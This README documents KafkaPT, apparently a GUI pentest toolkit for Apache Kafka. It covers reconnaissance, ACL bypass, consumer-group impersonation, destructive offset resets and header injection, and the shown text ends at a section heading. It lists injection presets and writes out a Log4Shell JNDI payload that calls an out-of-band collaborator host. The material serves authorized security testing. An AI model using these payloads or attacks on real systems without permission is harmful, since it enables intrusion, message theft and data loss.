[README.md](https://github.com/user-attachments/files/29375558/README.md)
# KafkaPT v2.0 — Kafka Pentest Toolkit

> **A desktop GUI for security testing Apache Kafka environments.**
> Built with Python and PyQt6. Designed for penetration testers, security researchers, and developers who need to audit Kafka deployments.

---

## Table of Contents

1. [Background — What is Apache Kafka?](#1-background--what-is-apache-kafka)
2. [What is Penetration Testing?](#2-what-is-penetration-testing)
3. [What is KafkaPT?](#3-what-is-kafkapt)
4. [Prerequisites](#4-prerequisites)
5. [Installation](#5-installation)
6. [Launching the Tool](#6-launching-the-tool)
7. [Interface Overview](#7-interface-overview)
8. [Configuration Tabs — Top Half](#8-configuration-tabs--top-half)
   - [SCHEMA](#81-schema-tab)
   - [CERTIFICATES](#82-certificates-tab)
   - [ENCRYPTION](#83-encryption-tab)
   - [PROXY / BURP](#84-proxy--burp-tab)
9. [Operation Tabs — Bottom Half](#9-operation-tabs--bottom-half)
   - [RECON](#91-recon-tab)
   - [ATTACK](#92-attack-tab)
   - [READ](#93-read-tab)
   - [SEND](#94-send-tab)
   - [RANDOMIZE](#95-randomize-tab)
   - [FINDINGS](#96-findings-tab)
10. [Typical Pentest Workflow](#10-typical-pentest-workflow)
11. [Injection Presets Reference](#11-injection-presets-reference)
12. [Understanding Findings](#12-understanding-findings)
13. [Exporting Results](#13-exporting-results)
14. [Troubleshooting](#14-troubleshooting)
15. [Legal Disclaimer](#15-legal-disclaimer)

---

## 1. Background — What is Apache Kafka?

Apache Kafka is a **message broker** — a system that lets applications send and receive data between each other. Think of it like an airport:

- **Topics** are like gates — data flows through them.
- **Producers** are applications that *send* messages to a topic (like a departing plane).
- **Consumers** are applications that *read* messages from a topic (like an arriving plane).
- **Brokers** are the Kafka servers that store and route the messages (the airport itself).
- **Consumer Groups** are teams of consumers working together to read the same topic.

Kafka is used heavily in banks, e-commerce platforms, healthcare systems, and anywhere that needs to move large volumes of data reliably. This also makes it a high-value target for security testing.

**What makes Kafka security interesting for a pentester?**

- Messages can contain sensitive data (payment records, personal information, credentials).
- If access controls (ACLs) are misconfigured, an attacker can read messages they shouldn't.
- Kafka message headers can be injected with attack payloads.
- Consumer group offsets can be manipulated to cause data loss or replay attacks.
- Schema Registry endpoints can be enumerated to discover data structures.

---

## 2. What is Penetration Testing?

Penetration testing (pentesting) is **authorized, controlled hacking**. A security professional is given permission by the system owner to attack their system in order to find vulnerabilities before a real attacker does.

A pentest is always conducted with:
- Written authorization (a scope document or statement of work).
- Defined boundaries (which systems can be tested, which cannot).
- A goal to find and document weaknesses, then help fix them.

**Never use this tool against systems you do not have written permission to test.**

---

## 3. What is KafkaPT?

KafkaPT v2.0 is a **desktop GUI tool** (a program with windows and buttons) that helps you perform security tests against Apache Kafka environments. It wraps common Kafka pentest tasks into a visual interface so you don't have to memorize command-line arguments.

**What KafkaPT can do:**

| Capability | Description |
|---|---|
| Connect with mTLS | Connect to brokers and Schema Registry using client certificates |
| Reconnaissance | Enumerate topics, brokers, consumer groups, and ACL rules |
| Read messages | Consume and inspect messages from any topic |
| Send messages | Produce messages with custom payloads and headers |
| Header injection | Test whether Kafka message headers reach downstream systems without sanitization |
| ACL bypass testing | Test whether your certificate can access topics it shouldn't |
| Offset manipulation | Reset consumer group offsets (replay / skip messages) |
| Schema enumeration | Brute-force Schema Registry IDs to discover data schemas |
| Burp Suite integration | Route HTTP traffic through Burp for interception and inspection |
| Avro support | Serialize and deserialize Avro-encoded messages |
| Payload encryption | Encrypt messages with AES or ChaCha20 before sending |
| Findings tracking | Automatically record vulnerabilities found during testing |
| Export reports | Export findings as Markdown and messages as NDJSON |

---

## 4. Prerequisites

### What you need before installing

**1. Python 3.11 or newer**

Check if Python is installed:
```bash
python3 --version
```
If not installed, download it from [python.org](https://www.python.org/downloads/).

**2. pip (Python package manager)**

Usually installed with Python. Check:
```bash
pip --version
```

**3. A Kafka environment to test**

You need a Kafka broker address (e.g. `kafka.internal:9093`) and permission from the owner to test it. If you want to test locally first, you can run a Kafka broker with Docker:

```bash
docker run -d --name kafka \
  -p 9092:9092 \
  -e KAFKA_CFG_NODE_ID=1 \
  -e KAFKA_CFG_PROCESS_ROLES=broker,controller \
  -e KAFKA_CFG_LISTENERS=PLAINTEXT://:9092,CONTROLLER://:9093 \
  -e KAFKA_CFG_LISTENER_SECURITY_PROTOCOL_MAP=CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT \
  -e KAFKA_CFG_CONTROLLER_QUORUM_VOTERS=1@localhost:9093 \
  -e KAFKA_CFG_CONTROLLER_LISTENER_NAMES=CONTROLLER \
  bitnami/kafka:latest
```

**4. (Optional) Burp Suite**

For HTTP interception (Schema Registry traffic). The free Community Edition works. Download from [portswigger.net](https://portswigger.net/burp).

**5. (Optional) mTLS certificates**

If the Kafka broker requires mutual TLS (client certificates), you need:
- `ca-cert.pem` — Certificate Authority certificate
- `client-cert.pem` — Your client certificate
- `client-key.pem` — Your client private key

Ask the system owner for test certificates.

---

## 5. Installation

### Step 1 — Clone or download the repository

```bash
git clone https://github.com/YOUR_USERNAME/kafkapt.git
cd kafkapt
```
Or download the ZIP from GitHub and extract it.

### Step 2 — (Recommended) Create a virtual environment

This keeps KafkaPT's dependencies separate from your system Python:

```bash
python3 -m venv venv

# On Linux / macOS:
source venv/bin/activate

# On Windows:
venv\Scripts\activate
```

You'll see `(venv)` in your terminal prompt when the environment is active.

### Step 3 — Install dependencies

```bash
pip install PyQt6 confluent-kafka fastavro requests cryptography
```

What each package does:

| Package | Purpose |
|---|---|
| `PyQt6` | The graphical interface framework |
| `confluent-kafka` | Connects to Kafka brokers (producer and consumer) |
| `fastavro` | Serializes and deserializes Avro-encoded messages |
| `requests` | HTTP client for Schema Registry communication |
| `cryptography` | AES and ChaCha20 payload encryption |

> **On Linux**, if you get a PyQt6 error about missing system libraries, run:
> ```bash
> sudo apt-get install libxcb-xinerama0 libxcb-icccm4 libxcb-image0 libxcb-keysyms1
> ```

### Step 4 — Verify the installation

```bash
python3 -c "import PyQt6, confluent_kafka, fastavro, requests, cryptography; print('All dependencies OK')"
```

You should see: `All dependencies OK`

---

## 6. Launching the Tool

```bash
python3 kafka-pt-v2.py
```

The KafkaPT window will open. The title bar shows **KafkaPT v2.0 // Kafka Pentest Toolkit**.

> **Theme**: Click the **☀ LIGHT** button in the top-right corner to switch between dark and light mode.

---

## 7. Interface Overview

The KafkaPT window is divided into two main sections:

```
┌──────────────────────────────────────────────────────────────┐
│  KAFKAPT                                          ☀ LIGHT    │
│  Kafka Pentest Toolkit / v2.0 / Sprint 1+2                   │
├──────────────────────────────────────────────────────────────┤
│                    CONFIGURATION TABS                        │
│  [ SCHEMA ] [ CERTIFICATES ] [ ENCRYPTION ] [ PROXY/BURP ]  │
│                                                              │
│  (configure your connection settings here before testing)    │
│                                                              │
├──────────────────────────────────────────────────────────────┤
│                     OPERATION TABS                           │
│ [ RECON ] [ ATTACK ] [ READ ] [ SEND ] [ RANDOMIZE ] [FIND] │
│                                                              │
│  (run your actual tests here)                                │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

**Top section** — Configuration tabs: set up your connection parameters once before testing.

**Bottom section** — Operation tabs: run individual test actions.

**Status bar** — At the very bottom, shows the current tool status.

---

## 8. Configuration Tabs — Top Half

These tabs must be configured **before** you run any operations. Think of this as filling in your connection settings.

---

### 8.1 SCHEMA Tab

**What it is:** Apache Kafka often uses a **Schema Registry** — a service that stores the data format (schema) for messages. KafkaPT can connect to this registry to download schemas and decode messages properly.

**Why it matters for pentesting:** The Schema Registry is an HTTP service. Traffic to it can be intercepted by Burp Suite. The registry may expose schemas that reveal internal data structures. IDs can be enumerated (guessed in sequence) to find schemas you weren't supposed to see.

#### Fields and buttons:

| Field / Button | What it does |
|---|---|
| **Registry URL** | The address of the Schema Registry, e.g. `http://schema-registry:8081` or `https://registry.internal:8443` |
| **Schema ID** (spinner) | The numeric ID of the schema you want to fetch. Start with `1`. |
| **FETCH SCHEMA** | Connects to the Registry and downloads the schema with the specified ID. The schema appears in the output area below. |
| **Schema status label** | Shows whether the fetch succeeded, failed, or is in progress. |
| **Enum IDs / from / to** | Sets the range of schema IDs to scan. For example, from `1` to `200` means KafkaPT will try every ID from 1 to 200. |
| **ENUMERATE** | Starts the brute-force scan. KafkaPT tries every ID in the range and reports which ones exist. Each found schema is shown in the output area. |
| **STOP** | Stops an in-progress enumeration. |
| **Progress bar** | Shows enumeration progress. |

#### How to use SCHEMA:

1. Enter the Schema Registry URL (ask the system owner or find it in the application config).
2. Enter Schema ID `1` and click **FETCH SCHEMA**.
3. If a schema loads, great — it will be used automatically for Avro decoding in the READ and SEND tabs.
4. To enumerate: set "from" to `1`, "to" to `500`, click **ENUMERATE**. Any schema IDs that exist will appear in green.

> **Pentest note:** If you can enumerate schemas you were not explicitly given access to, that is an **INFO/MEDIUM** finding depending on the sensitivity of the data structures revealed.

---

### 8.2 CERTIFICATES Tab

**What it is:** Kafka brokers often require **mutual TLS (mTLS)** — meaning both the server and the client must present certificates to each other to prove their identity. This tab is where you configure those certificates.

**Without this configured:** You can only connect to Kafka brokers that use plain (unencrypted, no-auth) connections, which is rare in production environments.

#### Fields and buttons:

| Field / Button | What it does |
|---|---|
| **mTLS — Schema Registry** checkbox | Enable certificate authentication for Schema Registry HTTP requests. |
| **mTLS — Kafka Broker** checkbox | Enable certificate authentication for all Kafka broker connections (READ, SEND, RECON, ATTACK). |
| **CA Cert** | Path to the Certificate Authority file (`.pem`). This is used to verify the server's identity. Click **BROWSE** to select the file. |
| **Client Cert** | Path to your client certificate file (`.pem`). This proves your identity to the server. |
| **Client Key** | Path to your private key file (`.pem`) that corresponds to your client certificate. |
| **Key Passphrase** | If your private key is password-protected, enter the password here. Leave empty if not needed. |
| **Verify server certificate** checkbox | When checked (default), KafkaPT verifies the server's certificate against the CA. **Uncheck** this if the broker uses a self-signed certificate — you will see a warning if so. |

#### How to use CERTIFICATES:

1. Check **mTLS — Kafka Broker** (and/or Schema Registry if needed).
2. Click **BROWSE** next to **CA Cert** and select your `ca-cert.pem` file.
3. Click **BROWSE** next to **Client Cert** and select your `client-cert.pem`.
4. Click **BROWSE** next to **Client Key** and select your `client-key.pem`.
5. If your key has a password, enter it in **Key Passphrase**.
6. Leave **Verify server certificate** checked unless using self-signed certs.

> **Pentest note:** If you can connect to a broker **without** certificates (plain connection on port 9092), that is a **HIGH** finding — the broker is not enforcing authentication.

---

### 8.3 ENCRYPTION Tab

**What it is:** Some Kafka deployments encrypt message payloads at the application level (in addition to TLS transport encryption). This tab lets you encrypt messages before sending them, to test whether systems correctly handle encrypted payloads.

**Most users will leave this tab as-is** (set to "None") unless the target system expects encrypted payloads.

#### Fields:

| Field | What it does |
|---|---|
| **Cipher Mode** | Choose the encryption algorithm: `None`, `AES-128-CBC`, `AES-256-CBC`, `AES-128-GCM`, `AES-256-GCM`, or `ChaCha20-Poly1305`. Default is `None (Avro only)`. |
| **Shared Secret** | The encryption key. Shown as dots (password field). Click **SHOW** to reveal. |
| **Key Encoding** | How the secret key is encoded: `hex`, `base64`, or `utf-8 raw`. |
| **IV / Nonce** | Initialization Vector handling: random per message (recommended), fixed, or prepended to ciphertext. |
| **Fixed IV** | If "Fixed" IV is selected, enter the IV here in hex. |

> Leave this as `None (Avro only)` unless you specifically know the target uses application-level encryption.

---

### 8.4 PROXY / BURP Tab

**What it is:** This tab configures KafkaPT to route its **HTTP traffic** (Schema Registry requests) through Burp Suite, so you can inspect, modify, and replay those requests in Burp. It also stores a **Collaborator URL** which is used in injection payloads to detect out-of-band callbacks.

**Why this matters:** Kafka's binary protocol cannot be intercepted by Burp directly. But Schema Registry uses HTTP — so Burp *can* intercept those requests. Also, Log4Shell and SSRF injection payloads need a server to "call home" to — the Collaborator URL is that server.

#### Fields and buttons:

| Field / Button | What it does |
|---|---|
| **Enable HTTP proxy** checkbox | Toggles proxy routing on/off. When ON, all Schema Registry HTTP requests go through Burp. |
| **Proxy URL** | Burp's listening address. Default is `http://127.0.0.1:8080` (Burp's default). Change if you configured Burp differently. |
| **TEST** button | Sends a test request through the proxy to verify Burp is running and reachable. |
| **Schema Registry** checkbox | Route Schema Registry traffic through the proxy. (Always checked when proxy is enabled.) |
| **Collaborator URL** | Your Burp Collaborator (or Interactsh) URL. Example: `abc123.oastify.com`. **Do not include `http://`**. |
| **Status label** | Shows whether the proxy is active and reachable. |

#### How to set up Burp integration:

1. Open Burp Suite. Make sure the Proxy listener is running on `127.0.0.1:8080`.
2. In KafkaPT, go to **PROXY / BURP** tab.
3. Check **Enable HTTP proxy**.
4. Click **TEST** — you should see "proxy reachable (HTTP 200)".
5. In **Collaborator URL**, enter your Burp Collaborator domain (generate one in Burp → Collaborator tab → "Copy to clipboard").
6. Now when you use **FETCH SCHEMA** or **ENUMERATE** in the SCHEMA tab, those requests will appear in Burp's HTTP history.

> **Collaborator tip:** The `COLLAB` placeholder in injection presets is automatically replaced with this URL when you apply a preset. So `${jndi:ldap://COLLAB/a}` becomes `${jndi:ldap://abc123.oastify.com/a}`.

---

## 9. Operation Tabs — Bottom Half

These are the tabs where you actually run tests. They appear in pentest workflow order: first RECON (gather information), then ATTACK (test vulnerabilities), then READ and SEND (interact with data).

---

### 9.1 RECON Tab

**What it is:** Reconnaissance means gathering information about the target before attacking. The RECON tab connects to the Kafka broker and collects:
- What brokers exist and on what addresses.
- What topics are visible.
- What consumer groups are active.
- What ACL rules are configured.

**Why this matters:** You need to know what topics exist before you can test them. Consumer groups and ACL rules reveal the security architecture. A wildcard ACL (`User:*`) is an immediate critical finding.

#### Fields and buttons:

| Field / Button | What it does |
|---|---|
| **Broker** field | Enter the broker address: `hostname:port`, e.g. `kafka.internal:9093`. |
| **RUN ALL** button | Runs all three phases (topology + groups + ACLs) in one click. Start here. |
| **FETCH TOPOLOGY** button | Fetches only broker and topic information. Uses `Consumer.list_topics()` — works even without admin rights. |
| **LIST GROUPS** button | Lists consumer groups. Uses `AdminClient.list_consumer_groups()` — may require admin access. |
| **DESCRIBE ACLs** button | Retrieves ACL rules. Requires `DescribeConfigs` admin permission. If denied, that denial itself is shown (not an error). |
| **STOP** button | Terminates an in-progress recon operation. |

#### Sub-tabs inside RECON:

**TOPOLOGY sub-tab:**
- Left panel: **Brokers** list — shows broker ID, hostname, and port.
- Right panel: **Topics** list — shows topic name and number of partitions.

**GROUPS sub-tab:**
- Lists all consumer group IDs visible to your certificate.

**ACLS sub-tab:**
- Displays each ACL rule in the format: `ResourceType:ResourceName:Principal:Operation:Permission`.
- Lines where **User:* has Allow** permissions are highlighted in red — this means everyone has access.
- A warning label appears at the bottom if wildcard ACLs are found.

#### How to run RECON:

1. Enter the **Broker** address (e.g. `kafka.internal:9093`).
2. Make sure certificates are configured in the **CERTIFICATES** tab.
3. Click **RUN ALL**.
4. Wait a few seconds. Results appear in the sub-tabs.
5. Check the **ACLS** sub-tab for red entries.
6. Check the **FINDINGS** tab — recon automatically adds findings for discovered topics, groups, and wildcard ACLs.

> **Common result:** "ACL enumeration denied — not authorized" is **normal** for non-admin certificates and is not an error. It means the broker is correctly restricting ACL visibility.

---

### 9.2 ATTACK Tab

**What it is:** The ATTACK tab groups three categories of active attacks. Each sub-tab is a different type of test. All attacks require explicit authorization from the system owner.

> ⚠️ **Warning:** Actions in this tab can cause service disruption. The OFFSET ATTACK sub-tab can cause permanent data loss. Always get written authorization before using these features.

---

#### ATTACK → HEADER INJECT sub-tab

**What it is:** Kafka messages can carry **headers** — key-value metadata attached to each message, separate from the message body. These headers are often passed to downstream systems (e.g. a web application that processes the message). If those systems don't sanitize the header values, injection attacks are possible.

**What you're testing:** Whether a malicious value in a Kafka message header reaches and is executed by a backend system. Common payloads: Log4Shell (`${jndi:ldap://...}`), SSRF, template injection.

| Field / Button | What it does |
|---|---|
| **Broker** | Broker address for this specific test. |
| **Topic** | Topic to send the injected message to. |
| **Message body** | The JSON body of the message. Default `{"legit":"payload"}`. Leave as-is unless the consumer validates body structure. |
| **Preset dropdown** | Choose an injection type from the list (Log4Shell, SSRF, SQLi, XSS, etc.). When you select a preset, the payload is applied to all header value cells. |
| **+** button | Add a new header row. |
| **−** button | Remove the selected header row. |
| **Header Name column** | The name of the Kafka header (e.g. `X-Correlation-ID`, `User-Agent`). |
| **Header Value column** | The injection payload (e.g. `${jndi:ldap://abc123.oastify.com/a}`). |
| **INJECT** button | Sends the message with all headers to the broker. |

**How to use HEADER INJECT:**

1. Enter Broker and Topic.
2. In the **PROXY / BURP** tab, make sure your Collaborator URL is set.
3. Back in ATTACK → HEADER INJECT, click **+** to add a row. The default header name is `X-Correlation-ID`.
4. From the **Preset** dropdown, select `Log4Shell — JNDI/LDAP`. The value column auto-fills with `${jndi:ldap://YOUR_COLLAB_URL/a}`.
5. Add more headers if needed (click **+** again, change the name).
6. Click **INJECT**.
7. Monitor Burp Collaborator for DNS/HTTP callbacks. A callback means the downstream system processed the header and the server attempted to connect to your Collaborator — **CRITICAL finding**.

---

#### ATTACK → ACL BYPASS sub-tab

**What it is:** ACLs (Access Control Lists) in Kafka define which clients can read from or write to which topics. If ACLs are misconfigured, your certificate might be able to access topics it shouldn't.

| Field / Button | What it does |
|---|---|
| **Broker** | Broker address. |
| **Target topic** | A topic you should NOT have access to. You discover these from RECON. |
| **Ghost group ID** | The consumer group ID of a *legitimate* service you want to impersonate. Also from RECON. |
| **TEST READ** | Tries to consume 1 message from the target topic. If a message arrives — that's an ACL bypass. If blocked, the error message is shown. |
| **TEST WRITE** | Tries to produce a marker message to the target topic. If delivered — ACL bypass. |
| **GHOST JOIN** | Joins the specified consumer group on the target topic. If Kafka allows it, your client gets assigned partitions — stealing messages from the legitimate service. A confirmation dialog appears first. |

**How to use ACL BYPASS:**

1. Run **RECON → TOPOLOGY** first to discover topics you shouldn't have access to.
2. Run **RECON → GROUPS** to find legitimate consumer group IDs.
3. Enter a forbidden topic name in **Target topic**.
4. Click **TEST READ**. Watch the output log.
   - "blocked: TOPIC_AUTHORIZATION_FAILED" → ACL is working correctly.
   - A message appears → **CRITICAL finding**, automatically added to FINDINGS.
5. Click **TEST WRITE**. Same logic applies.
6. For **GHOST JOIN**: enter a legitimate group ID in **Ghost group ID**, click the button, read the warning carefully, click OK only if you're authorized. If messages arrive — CRITICAL finding.

---

#### ATTACK → OFFSET ATTACK sub-tab

**What it is:** Kafka tracks the "offset" — how far each consumer group has read in each topic. By resetting this offset, you can force consumers to re-read old messages (replay attack) or skip ahead so they miss current messages (data loss).

> ⚠️ **This is a destructive operation.** "Latest" mode causes message loss. A confirmation dialog with a warning appears before any reset is executed.

| Field / Button | What it does |
|---|---|
| **Broker** | Broker address. |
| **Consumer Group** | The group whose offsets you want to reset. |
| **Topic** | The topic in which to reset offsets. |
| **Reset to** | `earliest` (re-read all messages from the beginning), `latest` (skip to current end, missing all pending messages), or `specific offset` (jump to a particular position). |
| **Specific offset** spinner | Only active when "specific offset" is selected. Enter the target offset number. |
| **EXECUTE OFFSET RESET** | Executes the reset. A mandatory confirmation dialog appears with a warning about consequences. |

**How to use OFFSET ATTACK:**

1. Enter Broker, Consumer Group (from RECON), and Topic.
2. Choose reset type — use "earliest" for replay tests (safer).
3. Click **EXECUTE OFFSET RESET**.
4. Read the warning dialog carefully. Click OK only if authorized.
5. Monitor the target consumer application — it should start reprocessing messages.
6. The finding is automatically added to the FINDINGS tab.

---

### 9.3 READ Tab

**What it is:** The READ tab is a Kafka consumer — it reads messages from a topic and displays them in a human-readable format. This is used to inspect what data is flowing through a topic.

**Why useful for pentesting:** You can find PII (personal data), credentials, API keys, or other sensitive information in messages. KafkaPT automatically scans messages for these and adds findings.

#### Fields and buttons:

| Field / Button | What it does |
|---|---|
| **Broker** | Broker address (top bar). |
| **Topic** | Topic to read from. |
| **Consumer Group** | The consumer group ID to use. Default is `kafkapt-consumer`. Change if the topic requires a specific group. |
| **Start Offset** | `latest` — read only new messages. `earliest` — read all messages from the beginning (may be very many). `specific` — read from a particular offset number. |
| **Specific offset** spinner | Appears when "specific" is selected. Enter the offset number. |
| **Max Messages** | Maximum number of messages to consume. Default is 1. Increase for bulk inspection. |
| **READ MESSAGE(S)** | Starts consuming. Messages appear in the left log pane as they arrive. |
| **STOP** | Stops consuming before reaching the max message count. |
| **CLEAR** | Clears all received messages from the display. |
| **EXPORT NDJSON** | Saves all received messages to a `.ndjson` file (one JSON object per line). Each record includes topic, partition, offset, timestamp, headers, decoded value, and raw hex. |
| **< PREV / NEXT >** buttons | Navigate between received messages in the detail view. |
| **Ignore schema** checkbox | Skip Avro decoding. Shows raw bytes instead. Useful when you don't have the schema. |
| **Display as** dropdown | How to render raw bytes: `auto-detect` (tries JSON, then UTF-8, then hex dump), `hex`, `hex dump` (visual layout), `UTF-8 raw`, or `base64`. |
| **Show headers** checkbox | Shows Kafka message headers (if any) at the bottom of the detail view. |
| **COPY** button | Copies the currently displayed message to clipboard. |
| **Message count** label | Shows "N received" as messages arrive. |

#### Detail view (right panel):

Shows the full decoded content of the currently selected message:
- Decoded message body (JSON, Avro-decoded, or raw bytes depending on settings).
- Message metadata (topic, partition, offset, timestamp).
- Kafka headers (if "Show headers" is checked).

**How to use READ:**

1. Enter Broker, Topic, and Consumer Group.
2. Set **Start Offset** to `earliest` to read historical messages, or `latest` for live traffic.
3. Set **Max Messages** (e.g. `10` for a sample).
4. Click **READ MESSAGE(S)**.
5. Messages appear in the left pane. Click one, then use **< PREV** / **NEXT >** to navigate.
6. Check the right detail pane for sensitive content.
7. Click **EXPORT NDJSON** to save evidence for your report.

> **PII auto-scan:** KafkaPT automatically checks each message for credit card numbers, email addresses, and credential keywords. If found, a **HIGH** finding is added automatically to the FINDINGS tab.

---

### 9.4 SEND Tab

**What it is:** The SEND tab is a Kafka producer — it sends messages to a topic. Used for injection testing, ACL bypass tests, and verifying that certain payloads reach downstream systems.

#### Fields and buttons:

| Field / Button | What it does |
|---|---|
| **Broker** | Broker address. |
| **Topic** | Topic to publish to. |
| **Message Key** | Optional partition key. Kafka uses the key to route the message to a consistent partition. Leave empty for random partition assignment. |
| **Payload Source** | `Manual JSON` — you type the payload. `From Randomizer` — use the RANDOMIZE tab to generate a random valid payload. `From Reader (replay)` — paste a message captured in the READ tab. |
| **Ignore schema** checkbox | Send raw bytes instead of Avro-serialized data. |
| **Encoding** (when raw) | `UTF-8`, `hex`, or `base64`. Tells KafkaPT how to interpret the raw payload text. |
| **Payload editor** (large text area) | Type or paste your JSON payload here. |
| **[ KAFKA HEADERS ] section** | The HeadersWidget for injecting Kafka headers (see below). |
| **SEND MESSAGE** | Sends the message(s). |
| **Repeat** checkbox | When checked, sends the message multiple times. |
| **Repeat count** spinner | Number of times to send. |
| **Sent count** label | Shows total messages successfully sent this session. |

#### Kafka Headers section in SEND:

The header injection UI works identically to the ATTACK → HEADER INJECT tab. Use it to add custom headers to every outgoing message:
- Use the **Preset** dropdown to fill in a payload type.
- Use **+** / **−** to add or remove header rows.
- Each row is a header name and value that will be attached to the sent message.

**How to use SEND:**

1. Enter Broker and Topic.
2. In the payload editor, type your JSON: `{"test": "kafkapt"}`.
3. Click **SEND MESSAGE**.
4. The delivery log below shows whether the message was accepted by the broker.
5. To add headers: click **+** in the headers section, enter a name like `X-Trace-ID` and a value.
6. To test Avro: load a schema in the SCHEMA tab first, then the payload will be Avro-serialized automatically.

---

### 9.5 RANDOMIZE Tab

**What it is:** When testing Avro-encoded topics, you need to send messages that conform to the schema. The RANDOMIZE tab automatically generates valid random data for any Avro schema.

**Why useful:** Instead of manually crafting a valid Avro payload, KafkaPT reads the loaded schema and generates realistic random data — useful for load testing, replay attacks, and verifying schema enforcement.

#### Fields and buttons:

| Field / Button | What it does |
|---|---|
| **GENERATE RANDOM PAYLOAD** | Generates one random valid JSON payload based on the schema loaded in the SCHEMA tab. |
| **COPY JSON** | Copies the generated JSON to clipboard (for pasting into the SEND tab manually). |
| **CLEAR** | Clears the generated payload display. |
| **Generated count** label | Shows how many payloads have been generated this session. |
| **Payload display** | Shows the generated JSON. |

**Supported Avro types:**
Null, boolean, int, long, float, double, string, bytes, arrays, maps, enums, unions, fixed, and all logical types (uuid, date, timestamps, decimal).

**How to use RANDOMIZE:**

1. First, go to the **SCHEMA** tab and fetch a schema (click FETCH SCHEMA).
2. Come back to **RANDOMIZE** tab.
3. Click **GENERATE RANDOM PAYLOAD**. A valid random JSON appears.
4. In the **SEND** tab, set **Payload Source** to `From Randomizer`.
5. Click **SEND MESSAGE** — KafkaPT generates a fresh random payload for each message.

---

### 9.6 FINDINGS Tab

**What it is:** Every time KafkaPT detects a potential vulnerability, it automatically records a **finding** here. A finding has a severity level, a description, evidence, and a timestamp. At the end of your test, export all findings as a Markdown report.

#### Severity levels:

| Severity | Color | Meaning |
|---|---|---|
| **CRITICAL** | Red | Immediate serious risk. ACL bypass, wildcard ACLs, stolen consumer group messages. |
| **HIGH** | Orange | Significant risk. PII in plaintext, successful injection delivery, offset manipulation. |
| **MEDIUM** | Yellow | Moderate risk. Sensitive data exposure, potentially dangerous configuration. |
| **LOW** | Green | Minor issues. Informational exposure with limited impact. |
| **INFO** | Teal | Observations. Topics discovered, groups enumerated, schemas found. |

#### Fields and buttons:

| Field / Button | What it does |
|---|---|
| **Finding count** label | Shows total findings accumulated this session. |
| **MARK FALSE POSITIVE** | Marks the selected finding as a false positive. It remains in the list but is noted as FP in exports. |
| **EXPORT MARKDOWN** | Saves all findings to a `.md` file, sorted by severity. |
| **CLEAR ALL** | Permanently deletes all findings (with confirmation). |
| **Findings list** (left panel) | Shows all findings sorted by severity. Columns: Severity, Title, Phase (recon/authz/injection/data), Time. |
| **Detail view** (right panel) | Full details of the selected finding: severity, title, phase, timestamp, description, and evidence. |

**Auto-generated findings:**

KafkaPT creates findings automatically when:
- Topics are visible via RECON → INFO
- Consumer groups are visible → INFO
- Schemas found via enumeration → INFO
- Wildcard ACL (`User:*`) detected → CRITICAL
- PII or credentials found in a message → HIGH
- Injection payload delivered → HIGH
- ACL read or write bypass → CRITICAL
- Ghost consumer joins and receives messages → CRITICAL
- Offset reset succeeds → HIGH

---

## 10. Typical Pentest Workflow

Here is the recommended order for a Kafka pentest using KafkaPT:

### Phase 1 — Setup

1. Open KafkaPT.
2. Go to **CERTIFICATES** tab. Enable mTLS for broker (and SR if needed). Load your certificate files.
3. Go to **PROXY / BURP** tab. Enable proxy, enter Burp URL. Enter your Collaborator URL.
4. Go to **SCHEMA** tab. Enter Schema Registry URL.

### Phase 2 — Reconnaissance

5. Go to **RECON** tab. Enter broker address. Click **RUN ALL**.
6. Note the topics in the **TOPOLOGY** sub-tab.
7. Note the consumer group IDs in the **GROUPS** sub-tab.
8. Check **ACLS** sub-tab for wildcard rules (red lines).
9. Go to **SCHEMA** tab. Enter Schema ID `1`, click **FETCH SCHEMA**. Try IDs 1–5. Set enum range 1–200 and click **ENUMERATE**.

### Phase 3 — Data Security Testing

10. Go to **READ** tab. Enter broker, topic (from step 6), group `kafkapt-consumer`.
11. Set offset to `earliest`, max messages to `20`. Click **READ MESSAGE(S)**.
12. Review messages in the detail pane for sensitive data.
13. Click **EXPORT NDJSON** to save captured messages as evidence.

### Phase 4 — Injection Testing

14. Go to **ATTACK → HEADER INJECT**. Enter broker and a topic you can write to.
15. Click **+**, leave name as `X-Correlation-ID`.
16. From Preset dropdown, select `Log4Shell — JNDI/LDAP`.
17. Verify your Collaborator URL was substituted in the value column.
18. Click **INJECT**.
19. Monitor Burp Collaborator for callbacks (wait 60 seconds).
20. Repeat for other headers (`User-Agent`, `X-Forwarded-For`) and other presets.

### Phase 5 — Authorization Testing

21. Go to **ATTACK → ACL BYPASS**. Enter broker.
22. In **Target topic**, enter a topic from RECON that you *shouldn't* have access to.
23. Click **TEST READ**. Note the result.
24. Click **TEST WRITE**. Note the result.
25. Enter a consumer group ID from RECON in **Ghost group ID**.
26. Click **GHOST JOIN** (confirm the dialog).

### Phase 6 — Report

27. Go to **FINDINGS** tab.
28. Review all findings. Mark any false positives.
29. Click **EXPORT MARKDOWN** to generate the report.

---

## 11. Injection Presets Reference

| Preset name | Attack type | What it tests |
|---|---|---|
| `Log4Shell — JNDI/LDAP` | Remote code execution | Whether Log4j2 processes the header and makes an outbound LDAP request |
| `Log4Shell — JNDI/RMI` | Remote code execution | Same but via RMI protocol |
| `Log4Shell — JNDI/DNS` | DNS callback | Simpler Log4Shell check — DNS lookup only |
| `SSTI — Jinja2` | Server-side template injection | Whether Jinja2 template engine evaluates `{{7*7}}` |
| `SSTI — FreeMarker` | Server-side template injection | Whether FreeMarker evaluates `${7*7}` |
| `SQLi — Error-based` | SQL injection | Whether the value reaches a database and causes an error |
| `SQLi — Union` | SQL injection | Union-based data extraction attempt |
| `XSS — Script tag` | Cross-site scripting | Whether header value is reflected in a web UI unsanitized |
| `XSS — Img onerror` | Cross-site scripting | Alternative XSS via image error handler |
| `Command Injection` | OS command injection | Whether the value is passed to a shell |
| `Path Traversal` | Directory traversal | Whether the value reaches a file system |
| `SSRF — AWS metadata` | Server-side request forgery | Whether the processing server fetches AWS internal metadata |
| `SSRF — Internal` | SSRF | Whether internal Spring Boot actuator is accessible |
| `XXE` | XML external entity | Whether an XML parser processes external entities |
| `Null byte` | Input sanitization | Whether null bytes cause unexpected behavior |
| `Large value (1 KB)` | Buffer overflow / DoS | Whether a 1 KB header value causes errors |

**How `COLLAB` placeholder works:**

When you set a Collaborator URL in the PROXY/BURP tab (e.g. `abc123.oastify.com`) and then apply a Log4Shell preset, `COLLAB` is replaced with your URL:

```
${jndi:ldap://COLLAB/a}  →  ${jndi:ldap://abc123.oastify.com/a}
```

This means any callback from the target system will appear in Burp Collaborator, proving the vulnerability.

---

## 12. Understanding Findings

